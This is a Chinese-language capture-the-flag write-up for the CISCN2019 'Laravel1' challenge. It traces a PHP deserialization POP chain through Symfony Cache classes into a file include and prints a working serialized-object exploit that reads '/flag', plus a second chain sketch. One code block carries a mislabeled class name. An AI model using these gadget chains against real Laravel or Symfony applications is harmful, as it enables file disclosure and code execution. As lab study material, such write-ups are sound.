# CISCN2019 总决赛

## [Day1 Web4]Laravel1

直接给源码

逻辑也很简单

就一行

```php
class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);//这一行触发反序列化
        }
    }
}
```

看来是要自己构造POP链了，

``unserialize($payload)``首先触发``__destruct() __wakeup()``这两个函数，在PhpStorm中使用``CRTL+SHIFT+F``

进行全局搜索。

找到

```php
namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface
{
    public function commit()
    {
        return $this->invalidateTags([]);
    }

    public function __destruct()
    {
        $this->commit();
    }
}
```

跟进``invalidateTags([])``

```php
namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface
{
	const TAGS_PREFIX = "\0tags\0";

    use ProxyTrait;
    use ContractsTrait;

    private $deferred = [];
    private $createCacheItem;
    private $setCacheItemTags;
    private $getTagsByKey;
    private $invalidateTags;
    private $tags;
    private $knownTagVersions = [];
    private $knownTagVersionsTtl;

	public function invalidateTags(array $tags)//传入$tags是空的
    {
        $ok = true;
        $tagsByKey = [];
        $invalidatedTags = [];
···

        if ($this->deferred) {
            $items = $this->deferred;//$deferred我们可以控制
            foreach ($items as $key => $item) {
                if (!$this->pool->saveDeferred($item)) {
                    unset($this->deferred[$key]);
                    $ok = false;
                }
            }

            $f = $this->getTagsByKey;
            $tagsByKey = $f($items);
            $this->deferred = [];
        }
···

        return $ok;
    }
}
```
然后我们看下``$this->pool->SaveDeferred()``是不是可控的，关键是``SaveDeferred()``因为``$pool``是可控的

找到``PhpArrayAdapter.php``

```php
class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface
{
    const TAGS_PREFIX = "\0tags\0";

    use ProxyTrait;
    use ContractsTrait;

    private $deferred = [];
    private $createCacheItem;
    private $setCacheItemTags;
    private $getTagsByKey;
    private $invalidateTags;
    private $tags;
    private $knownTagVersions = [];
    private $knownTagVersionsTtl;
...
    public function saveDeferred(CacheItemInterface $item)
    {
        if (null === $this->values) {
            $this->initialize();//这里调用了initialize();
        }

        return !isset($this->keys[$item->getKey()]) && $this->pool->saveDeferred($item);
    }
...
}
```

跟进看一下`initialize()`

```php
namespace Symfony\Component\Cache\Traits;

use Symfony\Component\Cache\CacheItem;
use Symfony\Component\Cache\Exception\InvalidArgumentException;
use Symfony\Component\VarExporter\VarExporter;

trait PhpArrayTrait
{
    use ProxyTrait;//表示继承ProxyTrait类
    
    private $file;
    private $keys;
    private $values;
    
    private function initialize()
    {
        if (!file_exists($this->file)) {
            $this->keys = $this->values = [];

            return;
        }
        $values = (include $this->file) ?: [[], []];//可以看到这里有文件包含

        if (2 !== \count($values) || !isset($values[0], $values[1])) {
            $this->keys = $this->values = [];
        } else {
            list($this->keys, $this->values) = $values;
        }
    }
}
```

POP链

 ```
TagAwareAdapter->destruct()->commit()->invalidateTags()->$this->pool->saveDeferred($item)

$this->pool: TagAwareAdapter->saveDeferred($item)->initialize()->this->$values = (include $this->file)
 ```

可以写出Exp(还得解决奇奇怪怪的类依赖问题，要多扒几个类出来才能正常编译)

```php
<?php
namespace Symfony\Component\Cache{

    use Symfony\Component\Cache\Adapter\ProxyAdapter;

    final class CacheItem{
        protected $key;
        protected $value;
        protected $isHit = false;
        protected $expiry;
        protected $defaultLifetime;
        protected $metadata = [];
        protected $newMetadata = [];
        protected $innerItem;
        protected $poolHash;
        protected $isTaggable = false;
        public function __construct()
        {
            $this->expiry = 'eki23323';
            $this->poolHash = '233';
            $this->key = '';
        }
    }
}
namespace Symfony\Component\Cache\Adapter{
    use Symfony\Component\Cache\CacheItem;
    class TagAwareAdapter{
        private $deferred = [];
        private $createCacheItem;
        private $setCacheItemTags;
        private $getTagsByKey;
        private $invalidateTags;
        private $tags;
        private $knownTagVersions = [];
        private $knownTagVersionsTtl;

        public function __construct()
        {
            $this->pool = new PhpArrayAdapter();
            $this->deferred = array('flight' => new CacheItem());
        }

    }
    class PhpArrayAdapter{
        private $file='/flag';
        public function __construct()
        {
            $this->file='/flag';
        }
    }
}
namespace {

    use Symfony\Component\Cache\Adapter\TagAwareAdapter;

    $tagAwareAdapter = new TagAwareAdapter();
    echo urlencode(serialize($tagAwareAdapter));
}
?>
```

当然，找的时候可没有这么容易，因为有很多类看起来可以利用，但是最终能用的却不好找

还有一种POP链

```
TagAwareAdapter.php->destruct()->commit()->invalidateTags()->$this->pool->saveDeferred($item)

ProxyAdapter.php >saveDeferred()->dosave()->($this->setInnerItem)(SinnerItem,$item)
```

